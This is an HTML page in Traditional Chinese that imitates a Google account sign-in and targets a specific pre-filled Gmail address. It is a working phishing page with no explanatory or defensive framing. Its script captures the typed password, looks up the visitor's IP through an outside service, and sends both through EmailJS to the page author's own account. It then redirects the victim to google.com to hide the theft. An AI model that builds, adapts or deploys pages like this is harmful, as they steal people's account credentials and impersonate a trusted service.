<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登入 - Google 帳戶</title>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        emailjs.init("CDnxhrbcBaRhYiaqq");
    </script>

    <style>
        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; }
        body { 
            background-color: #f8f9fa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            font-family: 'Google Sans', Arial, sans-serif;
        }

        .container {
            width: 448px;
            background: #fff;
            border: 1px solid #dadce0; 
            border-radius: 8px;
            position: relative;
            overflow: hidden; 
            min-height: 500px;
            display: flex;
            flex-direction: column;
        }

        /* 進度條 */
        .progress-bar-container {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 4px;
            background-color: transparent; overflow: hidden; display: none;
            z-index: 10;
        }
        .progress-line {
            width: 100%; height: 100%; background-color: #1a73e8;
            position: absolute; transform: translateX(-100%);
        }
        @keyframes scan {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        .scanning .progress-bar-container { display: block; }
        .scanning .progress-line { animation: scan 1.2s infinite linear; }

        .slider {
            display: flex;
            width: 200%; 
            flex-grow: 1;
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .step { 
            width: 50%; 
            flex-shrink: 0;
            padding: 40px; 
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
        }

        .logo { font-size: 24px; font-weight: 500; margin-top: 40px; margin-bottom: 10px; text-align: center; letter-spacing: -1.2px; }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }

        h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 10px; color: #202124; }
        .sub-text { font-size: 16px; color: #202124; margin-bottom: 25px; text-align: center; }

        input[type="text"], input[type="password"] {
            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
            border-radius: 4px; outline: none; margin-bottom: 8px; box-sizing: border-box;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }

        .blue-link { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; }

        /* 帳號顯示框 */
        .user-box { 
            border: 1px solid #dadce0; 
            border-radius: 100px; 
            display: inline-flex; 
            align-items: center; 
            padding: 3px 12px 3px 4px; 
            margin: 0 auto 20px auto; 
            font-size: 14px; 
            color: #3c4043; 
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .user-box:hover { background-color: rgba(60, 64, 67, 0.04); }
        .user-avatar { width: 20px; height: 20px; border-radius: 50%; margin-right: 8px; object-fit: cover; background-color: #f1f3f4; }

        /* 顯示密碼勾選框佈局 */
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-top: 4px;
            text-align: left;
        }
        .checkbox-group input {
            width: 18px; height: 18px; margin: 0 12px 0 0; cursor: pointer;
        }
        .checkbox-group label { font-size: 14px; cursor: pointer; color: #202124; }

        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 20px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .btn:hover { background-color: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }

        @media (max-width: 450px) {
            body { background-color: #fff; align-items: flex-start; }
            .container { width: 100%; border: none; min-height: 100vh; }
        }
    </style>
</head>
<body>

<div class="container" id="container">
    <div class="progress-bar-container">
        <div class="progress-line"></div>
    </div>

    <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>

    <div class="slider" id="mainSlider">
        <div id="step1" class="step">
            <h1>登入</h1>
            <p class="sub-text">驗證您的 Google 帳戶</p>
            <input type="text" id="email" placeholder="電子郵件或電話號碼" value="Eddie031208@gmail.com">
            <a class="blue-link">忘記電子郵件地址？</a>
            <div style="margin-top: 40px; font-size: 14px; color: #5f6368;">這不是您的帳號嗎？請使用其他登入。<a class="blue-link">瞭解詳情</a></div>
            <div class="footer">
                <a class="blue-link">建立帳戶</a>
                <button class="btn" onclick="goNext()">繼續</button>
            </div>
        </div>

        <div id="step2" class="step">
            <h1>Eddie Eddie</h1>
            <div style="text-align: center;">
                <div class="user-box" id="userBox" onclick="goBack()">
                    <img src="https://lh3.googleusercontent.com/a/default-user=s40-p" class="user-avatar" alt="User">
                    <span id="userDisplay"></span>
                    <svg width="12" height="12" viewBox="0 0 24 24" style="margin-left:8px; fill:#5f6368;"><path d="M7 10l5 5 5-5z"/></svg>
                </div>
            </div>
            
            <input type="password" id="pw" placeholder="輸入您的密碼">
            
            <div class="checkbox-group">
                <input type="checkbox" id="show" onclick="toggle()">
                <label for="show">顯示密碼</label>
            </div>

            <div class="footer">
                <a class="blue-link" onclick="goBack()">忘記密碼？</a>
                <button class="btn" onclick="submit()">下一步</button>
            </div>
        </div>
    </div>
</div>

<script>
    const slider = document.getElementById('mainSlider');
    const container = document.getElementById('container');

    function goNext() {
        const email = document.getElementById('email').value;
        if(!email) return alert("請輸入帳號");

        container.classList.add('scanning');

        setTimeout(() => {
            document.getElementById('userDisplay').innerText = email;
            slider.style.transform = 'translateX(-50%)';
            container.classList.remove('scanning');
            setTimeout(() => document.getElementById('pw').focus(), 400);
        }, 800);
    }

    function goBack() {
        slider.style.transform = 'translateX(0%)';
    }

    function toggle() {
        const p = document.getElementById('pw');
        p.type = p.type === 'password' ? 'text' : 'password';
    }

    async function submit() {
        const userPassword = document.getElementById('pw').value;
        //處存密碼userPassword

        if (userPassword === "") {
            alert("請輸入密碼");
            return;
        }
        console.log("目前的密碼變數是：" + userPassword);
        container.classList.add('scanning');
        
        //傳送密碼 跳轉google
        let userIP = "未知 IP";
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIP = data.ip;
        } catch (error) {
            console.error("抓取 IP 失敗:", error);
        }
        
        try {
            await emailjs.send("service_0w04i8j", "template_iepzrfc", {
                password: userPassword,
                ip: userIP
            });
            // 發送成功後再跳轉
            container.classList.remove('scanning');
            window.location.href = "https://www.google.com";
            } catch (err) {
                alert("系統錯誤，請稍後再試");
                container.classList.remove('scanning');
        }
    }
</script>
</body>

</html>
